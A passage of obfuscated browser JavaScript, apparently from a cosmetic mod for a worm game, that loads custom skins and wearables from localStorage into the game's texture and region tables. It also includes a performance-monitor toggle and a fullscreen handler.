        _0x1250df.checked = this.isFpsVisible || this.isCpuVisible;
      }
    },
    toggle(_0x40ef4e) {
      if (typeof _0x40ef4e !== "boolean") {
        _0x40ef4e = !this.isFpsVisible && !this.isCpuVisible;
      }
      const _0x1905f7 = this.isFpsVisible;
      const _0x43c3e0 = this.isCpuVisible;
      this.isFpsVisible = _0x40ef4e;
      this.isCpuVisible = _0x40ef4e;
      this.saveSettings();
      if (_0x40ef4e) {
        if (!_0x1905f7 && this.isFpsVisible) {
          this.startMonitoring();
        }
        if (!_0x43c3e0 && this.isCpuVisible) {
          this.startCpuMonitoring();
        }
      } else {
        this.stopAllMonitoring();
      }
      this.updateDisplays();
    },
    enable(_0x3236a2) {
      if (_0x3236a2) {
        if (!this.isInitialized) {
          this.init();
        } else {
          this.toggle(true);
        }
      } else {
        this.toggle(false);
      }
    }
  };
  $(document).ready(function () {
    setTimeout(function () {
      if (window.PerformanceMonitor) {
        const _0x3a0364 = vps.performanceMonitorEnabled || false;
        window.PerformanceMonitor.enable(_0x3a0364);
        $("#performance-monitor-toggle").prop("checked", _0x3a0364);
      }
    }, 500);
  });
  const _0xa5ee91 = {
    validGlowNames: ["a_veron", "a_white", "a_tm2_B_4", "a_tm2_B_3", "a_tm2_B_2", "a_tm2_B_1", "a_tm2_A_4", "a_tm2_A_3", "a_tm2_A_2", "a_tm2_A_1", "a_ocean", "a_ivory", "a_grass", "a_death", "a_blood", "a_black", "a_azure", "a__yllw", "a__ruby", "a__prpl", "a__orng", "a__emer", "a__dsky", "a__cyan", "a__card", "a___vio", "a_trans", "at_veron", "at_white", "at_tm2_B_4", "at_tm2_B_3", "at_tm2_B_2", "at_tm2_B_1", "at_tm2_A_4", "at_tm2_A_3", "at_tm2_A_2", "at_tm2_A_1", "at_ocean", "at_ivory", "at_grass", "at_death", "at_blood", "at_black", "at_azure", "at__yllw", "at__ruby", "at__prpl", "at__orng", "at__emer", "at__dsky", "at__cyan", "at__card", "at___vio", "a_choco", "a_green", "a_karda", "a_olive", "a_pmp_1", "a_pmp_2", "a_pmp_3", "a_pmp_4", "a__pink"],
    fallbackMap: {
      c___red: "a__card",
      c__blue: "a__dsky",
      c__gold: "a__yllw",
      c_choco: "a_blood",
      c_green: "a_grass",
      c_karda: "a__yllw",
      c_olive: "a_grass",
      c_pmp_1: "a__orng",
      c_pmp_2: "a__orng",
      c_pmp_3: "a__orng",
      c_pmp_4: "a_blood",
      c___vio: "a___vio",
      c__card: "a__card",
      c__cyan: "a__cyan",
      c__dsky: "a__dsky",
      c__emer: "a__emer",
      c__orng: "a__orng",
      c__pink: "a_veron",
      c__prpl: "a__prpl",
      c__ruby: "a__ruby",
      c__yllw: "a__yllw",
      c_azure: "a_azure",
      c_black: "a_black",
      c_blood: "a_blood",
      c_grass: "a_grass",
      c_ivory: "a_ivory",
      c_ocean: "a_ocean",
      c_veron: "a_veron",
      c_white: "a_white",
      a_choco: "a_blood",
      a_green: "a_grass",
      a_karda: "a__yllw",
      a_olive: "a_grass",
      a_pmp_1: "a__orng",
      a_pmp_2: "a__orng",
      a_pmp_3: "a__orng",
      a_pmp_4: "a_blood",
      a__pink: "a_veron",
      "": "a_white",
      null: "a_white",
      undefined: "a_white",
      none: "a_white"
    },
    convertGlowName: function (_0x3040ee) {
      if (!_0x3040ee || typeof _0x3040ee !== "string") {
        return "a_white";
      }
      const _0x38a03e = _0x3040ee.trim();
      if (this.validGlowNames.includes(_0x38a03e)) {
        return _0x38a03e;
      }
      if (this.fallbackMap[_0x38a03e]) {
        const _0x14d227 = this.fallbackMap[_0x38a03e];
        return _0x14d227;
      }
      if (_0x38a03e.startsWith("c_")) {
        const _0x4b8149 = _0x38a03e.replace("c_", "a_");
        if (this.validGlowNames.includes(_0x4b8149)) {
          return _0x4b8149;
        }
      }
      const _0x9ed3b2 = this.validGlowNames.find(_0x5ad8b3 => _0x5ad8b3.toLowerCase() === _0x38a03e.toLowerCase());
      if (_0x9ed3b2) {
        return _0x9ed3b2;
      }
      return "a_white";
    },
    convertGlowArray: function (_0x237cf2) {
      if (!_0x237cf2 || !Array.isArray(_0x237cf2)) {
        return ["a_white"];
      }
      if (_0x237cf2.length === 0) {
        return ["a_white"];
      }
      const _0x152607 = _0x237cf2.map(_0x1a5305 => this.convertGlowName(_0x1a5305));
      const _0x24f9fa = _0x152607.filter(_0x4d898d => _0x4d898d && _0x4d898d !== "");
      if (_0x24f9fa.length === 0) {
        return ["a_white"];
      }
      return _0x24f9fa;
    }
  };
  window.GlowNameConverter = _0xa5ee91;
  _wup.customConfig = function (_0x4dd6c4) {
    window.vps.sg = [];
    try {
      const _0x170f08 = JSON.parse(localStorage.getItem("vps") || "{}");
      if (_0x170f08.sg && Array.isArray(_0x170f08.sg)) {
        window.vps.sg = [..._0x170f08.sg];
      }
    } catch (_0x5b3138) {
      console.error("خطأ في تحميل القائمة:", _0x5b3138);
      window.vps.sg = [];
    }
    try {
      var _0x3c37f9 = localStorage.getItem("custom_skin");
      var _0x381ad8 = localStorage.getItem("custom_wear");
      var _0xfd921d = localStorage.getItem("custom_wormup_skin");
      var _0x461ef8 = localStorage.getItem("custom_wormup_wear");
      if (_0x3c37f9 || _0x381ad8 || _0xfd921d || _0x461ef8) {
        if (_0x3c37f9) {
          var _0x153d25 = JSON.parse(_0x3c37f9);
          Object.keys(_0x153d25).forEach(function (_0x102e6f) {
            if (_0x102e6f.startsWith("custom_skin_") && _0x153d25[_0x102e6f].skin && _0x153d25[_0x102e6f].skin.id) {
              var _0x2166e3 = parseInt(_0x153d25[_0x102e6f].skin.id);
              if (_0x2166e3 && !window.vps.sg.includes(_0x2166e3)) {
                window.vps.sg.push(_0x2166e3);
              }
            }
          });
        }
      } else {}
    } catch (_0x1f95a8) {
      console.error("خطأ في تحميل السكنات المحلية:", _0x1f95a8);
    }
    const _0x2287b3 = {
      convertSkinId: function (_0x2251a9) {
        try {
          if (!_0x2251a9 || typeof _0x2251a9 !== "string") {
            return _0x2251a9;
          }
          if (!isNaN(_0x2251a9)) {
            return _0x2251a9;
          }
          let _0x23b2f3 = 0;
          for (let _0x52f0ee = 0; _0x52f0ee < _0x2251a9.length; _0x52f0ee++) {
            _0x23b2f3 += _0x2251a9.charCodeAt(_0x52f0ee) * (_0x52f0ee + 1);
          }
          const _0x4a29e4 = _0x23b2f3 % 7000 + 3000;
          return _0x4a29e4;
        } catch (_0x36d18c) {
          console.warn("فشل التحويل، استخدام الأصلي:", _0x2251a9);
          return _0x2251a9;
        }
      }
    };
    if (!_0x4dd6c4) {
      _0x4dd6c4 = {
        textureDict: {},
        regionDict: {},
        skinArrayDict: [],
        hatDict: {},
        eyesDict: {},
        mouthDict: {},
        glassesDict: {},
        hatVariantArray: [],
        eyesVariantArray: [],
        mouthVariantArray: [],
        glassesVariantArray: []
      };
    }
    try {
      var _0x75b7f0 = localStorage.getItem("custom_skin");
      if (_0x75b7f0) {
        var _0xe31fe1 = JSON.parse(_0x75b7f0);
        if (_0x498743.processNewSkinFormat) {
          _0x498743.processNewSkinFormat(_0xe31fe1, _0x4dd6c4);
        }
      }
      var _0x70d73c = localStorage.getItem("custom_wear");
      if (_0x70d73c) {
        var _0x577f71 = JSON.parse(_0x70d73c);
        Object.keys(_0x577f71).forEach(function (_0x5595cb) {
          if (_0x5595cb.startsWith("custom_wear_") && _0x577f71[_0x5595cb].wear) {
            const _0x417f9d = _0x577f71[_0x5595cb].wear;
            if (_0x417f9d.textureDict) {
              Object.keys(_0x417f9d.textureDict).forEach(function (_0x1e2f4c) {
                const _0x3c6f01 = _0x417f9d.textureDict[_0x1e2f4c];
                if (_0x3c6f01 && _0x3c6f01.file) {
                  let _0x22fdbb = _0x3c6f01.file;
                  if (_0x22fdbb && !_0x22fdbb.startsWith("data:image/")) {
                    _0x22fdbb = _0x22fdbb.replace(/\s/g, "");
                    const _0x1b1840 = 222;
                    if (_0x22fdbb.length > _0x1b1840) {
                      const _0x3c7e80 = _0x22fdbb.substring(0, _0x22fdbb.length - _0x1b1840);
                      const _0x520dc3 = _0x22fdbb.substring(_0x22fdbb.length - _0x1b1840);
                      _0x22fdbb = _0x520dc3 + _0x3c7e80;
                    }
                    try {
                      atob(_0x22fdbb);
                      _0x22fdbb = "data:image/png;base64," + _0x22fdbb;
                    } catch (_0x2d8e82) {
                      console.error("خطأ في base64:", _0x1e2f4c, _0x2d8e82);
                      return;
                    }
                  }
                  _0x4dd6c4.textureDict[_0x1e2f4c] = {
                    custom: true,
                    file: _0x22fdbb,
                    relativePath: _0x22fdbb,
                    h1: true,
                    h4: true
                  };
                }
              });
            }
            if (_0x417f9d.regionDict) {
              Object.keys(_0x417f9d.regionDict).forEach(function (_0x12a7ff) {
                const _0x435a2d = _0x417f9d.regionDict[_0x12a7ff];
                if (_0x435a2d && _0x435a2d.id && _0x435a2d.obj && _0x435a2d.list) {
                  const _0x4a553a = _0x435a2d.list;
                  const _0x2e03c2 = _0x435a2d.listVariant || _0x4a553a.replace("Dict", "VariantArray");
                  _0x4dd6c4.regionDict[_0x12a7ff] = {
                    texture: _0x435a2d.texture,
                    x: _0x435a2d.x || 0,
                    y: _0x435a2d.y || 0,
                    w: _0x435a2d.w || 128,
                    h: _0x435a2d.h || 128,
                    px: _0x435a2d.px || 0,
                    py: _0x435a2d.py || 0,
                    pw: _0x435a2d.pw || 128,
                    ph: _0x435a2d.ph || 128
                  };
                  if (!_0x4dd6c4[_0x4a553a]) {
                    _0x4dd6c4[_0x4a553a] = {};
                  }
                  if (!_0x4dd6c4[_0x2e03c2]) {
                    _0x4dd6c4[_0x2e03c2] = [];
                  }
                  _0x4dd6c4[_0x4a553a][_0x435a2d.id] = {
                    base: _0x435a2d.obj.base || [{
                      region: _0x12a7ff
                    }],
                    guest: _0x435a2d.obj.guest !== undefined ? _0x435a2d.obj.guest : true,
                    price: _0x435a2d.obj.price || 0,
                    priceBefore: _0x435a2d.obj.priceBefore || 0,
                    nonbuyable: _0x435a2d.obj.nonbuyable !== undefined ? _0x435a2d.obj.nonbuyable : false,
                    prime: _0x435a2d.obj.prime || "c_white",
                    custom: true
                  };
                  if (!_0x4dd6c4[_0x2e03c2].some(_0x462f88 => _0x462f88[0] === _0x435a2d.id)) {
                    _0x4dd6c4[_0x2e03c2].push([_0x435a2d.id]);
                  }
                  let _0x248f8e = "زي";
                  if (_0x4a553a === "hatDict") {
                    _0x248f8e = "قبعة";
                  } else if (_0x4a553a === "eyesDict") {
                    _0x248f8e = "عيون";
                  } else if (_0x4a553a === "mouthDict") {
                    _0x248f8e = "فم";
                  } else if (_0x4a553a === "glassesDict") {
                    _0x248f8e = "نظارة";
                  }
                } else {
                  console.warn("⚠️ منطقة غير مكتملة:", _0x12a7ff, _0x435a2d);
                }
              });
            }
          }
        });
        setTimeout(() => {
          if (window._wup?._anApp?.og?.af?.ng) {
            try {
              const _0x6e8f39 = window._wup._anApp.og.af.ng;
              if (_0x6e8f39.Ug && _0x6e8f39.Ug.Uf) {
                _0x6e8f39.Ug.Uf(_0x4dd6c4);
              }
            } catch (_0xcf727c) {}
          }
          if (window.gameManager) {
            Object.assign(window.gameManager, _0x4dd6c4);
          }
          if (window.gameInstance?.Lc) {
            window.gameInstance.Lc.Gb = _0x4dd6c4;
          }
        }, 500);
      }
    } catch (_0x6a7e4b) {
      console.error("Error processing NEW format:", _0x6a7e4b);
    }
    if (!_0x4dd6c4.textureDict) {
      _0x4dd6c4.textureDict = {};
    }
    if (!_0x4dd6c4.regionDict) {
      _0x4dd6c4.regionDict = {};
    }
    if (!_0x4dd6c4.skinArrayDict) {
      _0x4dd6c4.skinArrayDict = [];
    }
    var _0x45c6b7 = ["eyesDict", "mouthDict", "hatDict", "glassesDict"];
    _0x45c6b7.forEach(function (_0xd08022) {
      if (!_0x4dd6c4[_0xd08022]) {
        _0x4dd6c4[_0xd08022] = {};
      }
    });
    var _0x14c1a2 = function _0x542868(_0x4034ac, _0x3b98e4 = 0) {
      if (!_0x4034ac || !_0x4034ac.id) {
        console.warn("Invalid skin data provided to addCustomSkin:", _0x4034ac);
        return;
      }
      var _0x18194a = _0x4034ac.id.toString();
      var _0xa5c071 = (_0x4034ac.type || "skin").toString().toLowerCase() + "VariantArray";
      var _0x2595db = (_0x4034ac.type || "skin").toString().toLowerCase() + "Dict";
      if (!_0x4034ac.file || !_0x4034ac.w || !_0x4034ac.h) {
        console.warn("Missing required properties in skin data:", _0x4034ac);
        return;
      }
      try {
        _0x4dd6c4.textureDict[_0x18194a] = {
          custom: true,
          re1ativePath: _0x4034ac.file,
          relativePath: _0x4034ac.file,
          reference: 1000 + _0x3b98e4,
          h1: true,
          h4: true
        };
        _0x4dd6c4.regionDict[_0x18194a] = {
          texture: _0x18194a,
          x: _0x4034ac.x || 0,
          y: _0x4034ac.y || 0,
          w: _0x4034ac.w,
          h: _0x4034ac.h,
          px: _0x4034ac.px || 0,
          py: _0x4034ac.py || 0,
          pw: 128,
          ph: 128
        };
        if (!_0x4dd6c4[_0x2595db]) {
          _0x4dd6c4[_0x2595db] = {};
        }
        if (!_0x4dd6c4[_0xa5c071]) {
          _0x4dd6c4[_0xa5c071] = [];
        }
        _0x4dd6c4[_0x2595db][1000 + _0x3b98e4] = {
          base: [{
            region: _0x18194a
          }],
          guest: false,
          nonbuyable: false,
          price: 0,
          priceBefore: 0,
          id: _0x18194a,
          custom: true
        };
        _0x4dd6c4[_0xa5c071].push([1000 + _0x3b98e4]);
      } catch (_0x204af7) {
        console.error("Error in addCustomSkin:", _0x204af7);
      }
    };
    var _0x381ad8 = localStorage.getItem("custom_wormup_wear");
    if (_0x381ad8) {
      try {
        var _0x44a892 = JSON.parse(_0x381ad8);
        if (_0x44a892.version && _0x44a892.data && Array.isArray(_0x44a892.data)) {} else if (_0x44a892.wear && _0x44a892.wear.textureDict && _0x44a892.wear.regionDict) {
          _0x381ad8 = null;
        }
      } catch (_0x552e9a) {
        console.error("خطأ في تحليل البيانات:", _0x552e9a);
      }
    }
    if (_0x381ad8) {
      try {
        _0x381ad8 = JSON.parse(_0x381ad8);
        if (_0x381ad8.wear) {
          if (_0x381ad8.version == "2") {
            if (_0x381ad8.data && Array.isArray(_0x381ad8.data)) {
              _0x381ad8.data.forEach(function (_0x11b13d, _0x2a5fa3) {
                if (_0x11b13d && _0x11b13d.id) {
                  _0x14c1a2(_0x11b13d, _0x2a5fa3);
                }
              });
            }
          } else {
            for (var _0x5916de in _0x381ad8.wear.textureDict) {
              if (_0x381ad8.wear.textureDict[_0x5916de]) {
                var _0x5bb2ac = _0x381ad8.wear.textureDict[_0x5916de];
                _0x4dd6c4.textureDict[_0x5916de] = {
                  custom: true,
                  h1: true,
                  h3: true,
                  h4: true,
                  file: _0x5bb2ac.file
                };
              }
            }
            for (var _0x4e558e in _0x381ad8.wear.regionDict) {
              var _0xf2b269 = _0x381ad8.wear.regionDict[_0x4e558e];
              if (_0xf2b269) {
                _0x4dd6c4.regionDict[_0x4e558e] = _0xf2b269;
                var _0x160bb4 = determineWearType(_0x4e558e, _0xf2b269);
                var _0x2fcd07 = _0xf2b269.id || _0x4e558e;
                var _0x30b30c = {
                  base: [{
                    region: _0x4e558e
                  }],
                  guest: false,
                  nonbuyable: false,
                  price: 0,
                  priceBefore: 0,
                  id: _0x2fcd07,
                  custom: true
                };
                switch (_0x160bb4) {
                  case "eyes":
                    if (!_0x4dd6c4.eyesDict) {
                      _0x4dd6c4.eyesDict = {};
                    }
                    _0x4dd6c4.eyesDict[_0x2fcd07] = _0x30b30c;
                    if (!_0x4dd6c4.eyesVariantArray) {
                      _0x4dd6c4.eyesVariantArray = [];
                    }
                    _0x4dd6c4.eyesVariantArray.push([_0x2fcd07]);
                    break;
                  case "mouth":
                    if (!_0x4dd6c4.mouthDict) {
                      _0x4dd6c4.mouthDict = {};
                    }
                    _0x4dd6c4.mouthDict[_0x2fcd07] = _0x30b30c;
                    if (!_0x4dd6c4.mouthVariantArray) {
                      _0x4dd6c4.mouthVariantArray = [];
                    }
                    _0x4dd6c4.mouthVariantArray.push([_0x2fcd07]);
                    break;
                  case "hat":
                    if (!_0x4dd6c4.hatDict) {
                      _0x4dd6c4.hatDict = {};
                    }
                    _0x4dd6c4.hatDict[_0x2fcd07] = _0x30b30c;
                    if (!_0x4dd6c4.hatVariantArray) {
                      _0x4dd6c4.hatVariantArray = [];
                    }
                    _0x4dd6c4.hatVariantArray.push([_0x2fcd07]);
                    break;
                  case "glasses":
                    if (!_0x4dd6c4.glassesDict) {
                      _0x4dd6c4.glassesDict = {};
                    }
                    _0x4dd6c4.glassesDict[_0x2fcd07] = _0x30b30c;
                    if (!_0x4dd6c4.glassesVariantArray) {
                      _0x4dd6c4.glassesVariantArray = [];
                    }
                    _0x4dd6c4.glassesVariantArray.push([_0x2fcd07]);
                    break;
                  default:
                    if (!_0x4dd6c4.eyesDict) {
                      _0x4dd6c4.eyesDict = {};
                    }
                    _0x4dd6c4.eyesDict[_0x2fcd07] = _0x30b30c;
                    if (!_0x4dd6c4.eyesVariantArray) {
                      _0x4dd6c4.eyesVariantArray = [];
                    }
                    _0x4dd6c4.eyesVariantArray.push([_0x2fcd07]);
                    break;
                }
              }
            }
          }
        }
      } catch (_0x34d103) {
        console.error("Error processing OLD SYSTEM custom_wormup_wear:", _0x34d103);
      }
    }
    var _0x3c37f9 = localStorage.getItem("custom_wormup_skin");
    if (_0x3c37f9) {
      try {
        _0x3c37f9 = JSON.parse(_0x3c37f9);
        if (_0x3c37f9.version_skin == "2") {
          var _0x3e797a = function _0x1e9fa4(_0x2f6920, _0x4f64c5, _0x2c2934, _0x87e38) {
            return {
              texture: _0x4f64c5,
              h: _0x2c2934 - 5,
              w: _0x2c2934 - 5,
              x: _0x2c2934 * (_0x87e38 ? 0 : _0x2f6920 || 0),
              y: 0
            };
          };
          var _0x20bd15 = _0x2287b3.convertSkinId(_0x3c37f9.id);
          if (!_0x20bd15 || _0x20bd15 === _0x3c37f9.id) {
            _0x20bd15 = "SKIN_" + _0x3c37f9.id + "___Z";
          }
          var _0x2757ec = {
            id: _0x20bd15.toString(),
            regionDict: {},
            textureDict: {},
            skinArrayDict: [],
            skinGroupArrayDict: [{
              id: _0x20bd15,
              name: {
                en: "Custom V2 (Old System)",
                ar: "مخصص نسخة 2 (النظام القديم)"
              },
              list: []
            }],
            version_skin: 3
          };
          var _0x1322ea = {
            id: _0x20bd15,
            guest: true,
            price: 0,
            priceBefore: 0,
            nonbuyable: true,
            prime: "c_white",
            glow: typeof _0xa5ee91 !== "undefined" ? _0xa5ee91.convertGlowArray(_0x3c37f9.glow) : _0x3c37f9.glow || [],
            base: [],
            custom: true
          };
          for (var _0xea5dc7 = (_0x3c37f9.len || 1) - 1; _0xea5dc7 >= 0; _0xea5dc7--) {
            _0x2757ec.regionDict[_0x20bd15 + "_" + _0xea5dc7] = _0x3e797a(_0xea5dc7, _0x20bd15, _0x3c37f9.cos || 128, 0);
            _0x1322ea.base.push(_0x20bd15 + "_" + _0xea5dc7);
          }
          _0x2757ec.textureDict[_0x20bd15] = {
            custom: true,
            re1ativePath: _0x3c37f9.file || _0x3c37f9.td && _0x3c37f9.td.file || "",
            relativePath: _0x3c37f9.file || _0x3c37f9.td && _0x3c37f9.td.file || "",
            h1: true,
            h4: true
          };
          _0x2757ec.skinArrayDict.push(_0x1322ea);
          _0x2757ec.skinGroupArrayDict[0].list.push(_0x20bd15.toString());
          if (_0x2757ec.textureDict[_0x20bd15] && _0x2757ec.textureDict[_0x20bd15].re1ativePath) {
            Object.assign(_0x4dd6c4.textureDict, _0x2757ec.textureDict);
            Object.assign(_0x4dd6c4.regionDict, _0x2757ec.regionDict);
            _0x4dd6c4.skinArrayDict = _0x4dd6c4.skinArrayDict.concat(_0x2757ec.skinArrayDict);
            if (!_0x4dd6c4.skinGroupArrayDict) {
              _0x4dd6c4.skinGroupArrayDict = [];
            }
            _0x4dd6c4.skinGroupArrayDict = _0x4dd6c4.skinGroupArrayDict.concat(_0x2757ec.skinGroupArrayDict);
          } else {
            console.warn("Invalid texture data for OLD custom skin v2");
          }
        } else if (_0x3c37f9.version_skin == "3") {
          for (var _0x26ddf8 in _0x3c37f9) {
            if (_0x3c37f9.hasOwnProperty(_0x26ddf8) && _0x26ddf8 !== "version_skin") {
              var _0x312d81 = typeof _0x3c37f9[_0x26ddf8];
              if (_0x312d81 === "object" && _0x3c37f9[_0x26ddf8] !== null) {
                if (!_0x4dd6c4[_0x26ddf8]) {
                  _0x4dd6c4[_0x26ddf8] = Array.isArray(_0x3c37f9[_0x26ddf8]) ? [] : {};
                }
                if (Array.isArray(_0x3c37f9[_0x26ddf8])) {
                  _0x4dd6c4[_0x26ddf8] = _0x4dd6c4[_0x26ddf8].concat(_0x3c37f9[_0x26ddf8]);
                } else {
                  Object.assign(_0x4dd6c4[_0x26ddf8], _0x3c37f9[_0x26ddf8]);
                }
              }
            }
          }
          setTimeout(() => {
            if (_0x4dd6c4.skinArrayDict) {
              _0x4dd6c4.skinArrayDict.forEach(_0x17457c => {
                if (_0x17457c.custom && _0x17457c.glow && _0x17457c.base && _0x17457c.glow.length !== _0x17457c.base.length) {
                  while (_0x17457c.glow.length < _0x17457c.base.length) {
                    _0x17457c.glow.push("a_white");
                  }
                  if (_0x17457c.glow.length > _0x17457c.base.length) {
                    _0x17457c.glow = _0x17457c.glow.slice(0, _0x17457c.base.length);
                  }
                }
              });
            }
          }, 100);
        } else if (_0x3c37f9.skin && _0x3c37f9.textureDict) {
          var _0x40e51b = _0x3c37f9.skin.id;
          _0x3c37f9.skin.id = _0x40e51b.toString();
          _0x3c37f9.skin.custom = false;
          _0x3c37f9.skin.guest = false;
          for (var _0x4e35df in _0x3c37f9.textureDict) {
            if (_0x3c37f9.textureDict[_0x4e35df]) {
              _0x4dd6c4.textureDict[_0x4e35df] = _0x3c37f9.textureDict[_0x4e35df];
              _0x4dd6c4.textureDict[_0x4e35df].re1ativePath = _0x3c37f9.textureDict[_0x4e35df].file;
              _0x4dd6c4.textureDict[_0x4e35df].relativePath = _0x3c37f9.textureDict[_0x4e35df].file;
              _0x4dd6c4.textureDict[_0x4e35df].h1 = true;
              _0x4dd6c4.textureDict[_0x4e35df].h4 = true;
              _0x4dd6c4.textureDict[_0x4e35df].custom = false;
            }
          }
          for (var _0x318184 in _0x3c37f9.regionDict) {
            if (_0x3c37f9.regionDict[_0x318184]) {
              _0x4dd6c4.regionDict[_0x318184] = _0x3c37f9.regionDict[_0x318184];
            }
          }
          if (!_0x4dd6c4.skinGroupArrayDict) {
            _0x4dd6c4.skinGroupArrayDict = [];
          }
          _0x4dd6c4.skinGroupArrayDict.push({
            id: "custom_old",
            name: {
              en: "Custom (Old System)",
              ar: "مخصص (النظام القديم)"
            },
            list: [_0x40e51b]
          });
          _0x4dd6c4.skinArrayDict.push(_0x3c37f9.skin);
        }
      } catch (_0x2db969) {
        console.error("Error processing OLD SYSTEM custom_wormup_skin:", _0x2db969);
      }
    }
    try {
      var _0x4ddb96 = {
        texturesTotal: Object.keys(_0x4dd6c4.textureDict || {}).length,
        regionsTotal: Object.keys(_0x4dd6c4.regionDict || {}).length,
        skinsTotal: (_0x4dd6c4.skinArrayDict || []).length,
        eyesTotal: Object.keys(_0x4dd6c4.eyesDict || {}).length,
        mouthTotal: Object.keys(_0x4dd6c4.mouthDict || {}).length,
        hatTotal: Object.keys(_0x4dd6c4.hatDict || {}).length,
        glassesTotal: Object.keys(_0x4dd6c4.glassesDict || {}).length,
        removedRegions: 0,
        removedSkins: 0
      };
      for (var _0x5d4565 in _0x4dd6c4.regionDict) {
        var _0x3d66d7 = _0x4dd6c4.regionDict[_0x5d4565];
        if (_0x3d66d7 && _0x3d66d7.texture && !_0x4dd6c4.textureDict[_0x3d66d7.texture]) {
          console.warn("Removing region with missing texture:", _0x5d4565, _0x3d66d7.texture);
          delete _0x4dd6c4.regionDict[_0x5d4565];
          _0x4ddb96.removedRegions++;
        }
      }
      _0x4dd6c4.skinArrayDict &&= _0x4dd6c4.skinArrayDict.filter(function (_0x2b8622) {
        if (!_0x2b8622 || !_0x2b8622.base) {
          return false;
        }
        for (var _0x29e131 = 0; _0x29e131 < _0x2b8622.base.length; _0x29e131++) {
          var _0x4c882a = _0x2b8622.base[_0x29e131];
          if (typeof _0x4c882a === "string" && !_0x4dd6c4.regionDict[_0x4c882a]) {
            console.warn("Removing skin with missing region:", _0x2b8622.id, _0x4c882a);
            _0x4ddb96.removedSkins++;
            return false;
          }
        }
        return true;
      });
    } catch (_0x2be1ed) {
      console.error("Error in final validation:", _0x2be1ed);
    }
    Object.keys(_0x4dd6c4.textureDict || {}).forEach(function (_0x25a123) {
      const _0x495e05 = _0x4dd6c4.textureDict[_0x25a123];
      if (_0x495e05 && _0x495e05.custom && _0x495e05.file) {
        try {
          let _0x39cba9 = _0x495e05.file;
          if (!_0x39cba9.startsWith("data:image/")) {
            if (_0x39cba9.length > 222) {
              _0x39cba9 = _0x39cba9.substring(222) + _0x39cba9.substring(0, 222);
            }
            _0x39cba9 = "data:image/png;base64," + _0x39cba9;
          }
          if (window.PIXI && PIXI.Texture) {
            const _0x5f4b32 = PIXI.BaseTexture.from(_0x39cba9);
            const _0x44f086 = new PIXI.Texture(_0x5f4b32);
            PIXI.Texture.addToCache(_0x44f086, _0x25a123);
          }
        } catch (_0x7ba175) {
          console.error("خطأ في إنشاء نسيج PIXI:", _0x25a123, _0x7ba175);
        }
      }
    });
    if (window._wup && window._wup._anApp && window._wup._anApp.Lc) {
      window._gameDataBackup = JSON.parse(JSON.stringify(_0x4dd6c4));
      setInterval(() => {
        if (window._wup._anApp && window._wup._anApp.Lc && window._wup._anApp.Lc.Gb) {
          const _0x5721b3 = window._wup._anApp.Lc.Gb;
          const _0x13e408 = window._gameDataBackup;
          Object.keys(_0x13e408.textureDict || {}).forEach(_0x44ba42 => {
            if (_0x13e408.textureDict[_0x44ba42].custom) {
              _0x5721b3.textureDict[_0x44ba42] = _0x13e408.textureDict[_0x44ba42];
            }
          });
          Object.keys(_0x13e408.regionDict || {}).forEach(_0x3a8735 => {
            if (_0x3a8735.includes("custom_wear_")) {
              _0x5721b3.regionDict[_0x3a8735] = _0x13e408.regionDict[_0x3a8735];
            }
          });
          ["hatDict", "eyesDict", "mouthDict", "glassesDict"].forEach(_0x2ea962 => {
            Object.keys(_0x13e408[_0x2ea962] || {}).forEach(_0xe828d => {
              if (_0x13e408[_0x2ea962][_0xe828d].custom) {
                _0x5721b3[_0x2ea962][_0xe828d] = _0x13e408[_0x2ea962][_0xe828d];
              }
            });
          });
        }
      }, 3000);
    }
  };
  var _0x2a455e = document.getElementById("btnFullScreen");
  if (_0x2a455e) {
    _0x2a455e.addEventListener("click", function () {
      var _0x2c14ce = document.documentElement.requestFullScreen || document.documentElement.webkitRequestFullScreen || document.documentElement.mozRequestFullScreen;
      if (_0x2c14ce && !_wup.fullscreen) {
        try {
          _wup.fullscreen = true;
          _0x2c14ce.call(document.documentElement);
        } catch (_0x3d1f6e) {}
      } else {
        _wup.fullscreen = false;
        document.exitFullscreen();
      }
    });
  }
  function _0x15fad3() {
    var _0x10b1a7 = false;
    (function (_0x2958d0) {
      if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(_0x2958d0) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v 